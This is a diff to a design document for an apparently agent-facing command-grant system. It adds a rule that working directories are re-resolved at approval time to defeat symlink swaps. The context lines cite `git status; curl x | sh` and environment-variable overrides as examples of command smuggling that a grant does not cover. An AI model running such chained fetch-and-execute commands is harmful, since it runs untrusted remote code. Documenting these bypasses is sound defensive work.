@@ -126,6 +126,9 @@ rendered line with three markings:
 - a working directory outside `Workspace.root` is named in a `cwd <path> --`
   prefix. The directory is judged by real path, so a symlink inside the
   workspace that leads to another repository is named as that repository.
+  It is resolved again when the grant decision arrives: a directory swapped
+  for a symlink while an attended request waits is refused, and an approved
+  child starts in the directory that was judged.
 
 A grant for `git status *` therefore covers none of `git status; curl x | sh`,
 `git status` with `GIT_SSH_COMMAND` set, `git status` with `PATH` pointing
